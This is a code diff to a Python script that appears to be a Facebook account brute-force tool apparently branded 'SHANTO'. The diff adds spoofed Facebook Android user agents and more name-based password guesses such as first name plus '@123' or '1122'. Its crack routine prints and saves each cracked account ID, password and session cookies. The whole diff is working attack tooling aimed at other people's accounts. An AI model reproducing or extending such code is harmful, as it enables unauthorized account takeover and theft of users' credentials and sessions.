@@ -31,6 +31,10 @@ CON=sol()
 ua = "[FBAN/FB4A;FBAV/68.0.0.3073;FBBV/874034155;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/874034155;FBCR/PTCL;FBMF/INFINIX MOBILE LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X687;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
 ua = "[FBAN/FB4A;FBAV/73.0.0.2024;FBBV/463572925;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/463572925;FBCR/grameenphone;FBMF/INFINIX MOBILE LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X652A;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
 ua = "[FBAN/FB4A;FBAV/13.0.0.4140;FBBV/648586211;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/648586211;FBCR/Jazz;FBMF/INFINIX MOBILE LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X652C;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
+ua = "[FBAN/FB4A;FBAV/439.0.0.44.117;FBBV/446812233;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/446812233;FBCR/Airtel;FBMF/INFINIX MOBILE LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X672;FBSV/12;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
+ua = "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/309617247;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/309617247;FBCR/Airtel;FBMF/TECNO MOBILE LIMITED;FBBD/tecno;FBPN/com.facebook.katana;FBDV/TECNO_KG6;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
+ua = "[FBAN/FB4A;FBAV/343.0.0.13.79;FBBV/448128638;FBDM/{density=2.0113,width=720,height=1240};FBLC/cs_CZ;FBRV/448128638;FBCR/Airtel;FBMF/TECNO MOBILE LIMITED;FBBD/tecno;FBPN/com.facebook.katana;FBDV/TECNO_KG8;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
+ua = "[FBAN/FB4A;FBAV/256.2.0.23.117;FBBV/204614705;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/204614705;FBCR/Airtel;FBMF/SAMSUNG MOBILE LIMITED;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG_SCV37;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -427,10 +431,17 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(nmf)
+					pwv.append('57273200')
 					pwv.append(frs+'@')
+					pwv.append(frs+'@123')
 					pwv.append(frs+'@@')
 					pwv.append(frs+'@@@')
-
+					pwv.append(frs+'@@@@')
+					pwv.append(frs+'@#')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'12')
+					pwv.append(frs+'11')
+					pwv.append(frs+'111')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
@@ -439,10 +450,17 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(nmf)
+					pwv.append('57273200')
 					pwv.append(frs+'@')
 					pwv.append(frs+'@123')
 					pwv.append(frs+'@@')
 					pwv.append(frs+'@@@')
+					pwv.append(frs+'@@@@')
+					pwv.append(frs+'@#')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'12')
+					pwv.append(frs+'11')
+					pwv.append(frs+'111')
 					
 				pool.submit(crack,idf,pwv)
 	print('')
@@ -483,7 +501,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				#SHANTO-King
-				print(f'\r\033[0;92m[SHANTO-âž¼-OKðŸŒº] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
+				print(f'\r\033[0;92m[SHANTO•OK] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
 				print('\033[0;94m===============================================')
 				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
 				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
